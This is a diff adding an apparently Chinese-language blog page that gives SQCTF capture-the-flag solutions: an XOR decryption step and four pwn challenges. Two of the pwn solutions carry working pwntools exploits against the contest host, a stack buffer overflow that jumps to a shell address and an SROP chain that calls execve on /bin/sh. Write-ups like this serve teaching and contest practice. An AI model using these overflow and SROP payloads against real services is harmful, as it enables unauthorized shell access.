+# Step 2: XOR with 85 to reverse the first XOR operation
+decrypted_data = [data ^ 85 for data in step1_decrypted]
+
+# Convert decrypted numbers to ASCII characters
+decrypted_string = &#39;&#39;.join(chr(data) for data in decrypted_data)
+
+print(&quot;Decrypted Data (Numbers):&quot;, decrypted_data)
+
+</code></pre>
+<p>Decrypted Data (Numbers): [128, 124, 130, 132, 120, 128, 122, 132, 130, 124, 128, 120, 124, 132, 120, 130]</p>
+<p>flag就是SQCTF{128,124,130,132,120,128,122,132,130,124,128,120,124,132,120,130}</p>
+<h1 id="Pwn-解出4题"><a href="#Pwn-解出4题" class="headerlink" title="Pwn 解出4题"></a>Pwn 解出4题</h1><h2 id="浅红欺醉粉，肯信有江梅"><a href="#浅红欺醉粉，肯信有江梅" class="headerlink" title="浅红欺醉粉，肯信有江梅"></a>浅红欺醉粉，肯信有江梅</h2><p>nc连接即可拿到shell</p>
+<pre><code class="bash">ls
+cat flag
+</code></pre>
+<p>sqctf{24fee39487a84431b06db644c829f55c}</p>
+<h2 id="领取你的小猫娘"><a href="#领取你的小猫娘" class="headerlink" title="领取你的小猫娘"></a>领取你的小猫娘</h2><p>不用pwntool，直接nc连上去，灌进去77个A即可拿到shell</p>
+<pre><code class="bash">ls
+cat flag
+</code></pre>
+<p>sqctf{f89de5c863644168b7f9de37372ac1c7}</p>
+<h2 id="江南无所有，聊赠一枝春"><a href="#江南无所有，聊赠一枝春" class="headerlink" title="江南无所有，聊赠一枝春"></a>江南无所有，聊赠一枝春</h2><p>开了NX，不过没关系，照样打</p>
+<p>ida看一下，64个字节长的v4，还有8字节长的RBP寄存器，都需要覆盖掉</p>
+<p>也就是需要发送72字节的垃圾数据，然后才能跟地址</p>
+<pre><code class="python">from pwn import *
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+p=remote(&#39;challenge.qsnctf.com&#39;,30042)
+payload = b&#39;A&#39;*72
+shell_address = 0x4011D7
+payload += p64(shell_address)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<pre><code class="bash">ls /
+cat /flag
+</code></pre>
+<p>sqctf{12f7861090ed42fda6c14dde2ad98caa}</p>
+<h2 id="当时只道是寻常"><a href="#当时只道是寻常" class="headerlink" title="当时只道是寻常"></a>当时只道是寻常</h2><p>这个题出的很有水平，需要构造SROP链</p>
+<p>ida逆向，看到给了一个8字节的v3数组，read读了1024字节长，而且只有pop rax; ret这一个可用的gadget和程序里一个地址内存放着的binsh字符串</p>
+<p>很标准的srop题了。</p>
+<p>直接上payload</p>
+<pre><code class="python">from pwn import *
+
+target = &#39;./pwn01&#39;
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+
+binsh_addr = 0x40203A
+pop_rax_ret_addr = 0x40104A
+syscall_addr = 0x40101D
+
+rt_sigreturn = 15
+
+execve_syscall = 59
+
+offset_ret = 8
+
+p = process(target)
+p= remote(&#39;challenge.qsnctf.com&#39;,31620)
+
+
+payload = b&#39;A&#39;* offset_ret
+payload += p64(pop_rax_ret_addr)
+payload += p64(rt_sigreturn)
+payload += p64(syscall_addr)
+
+frame = SigreturnFrame()
+frame.rax = execve_syscall
+frame.rdi = binsh_addr
+frame.rsi = 0
+frame.rdx = 0
+frame.rip = syscall_addr
+
+payload += bytes(frame)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<pre><code class="bash">ls /
+cat /flag
+</code></pre>
+<p>sqctf{c14afe377c974cf6b9d380a91ac72095}</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2020 - 2025 PR0_M1X 的小站
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;PR0_M1X
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
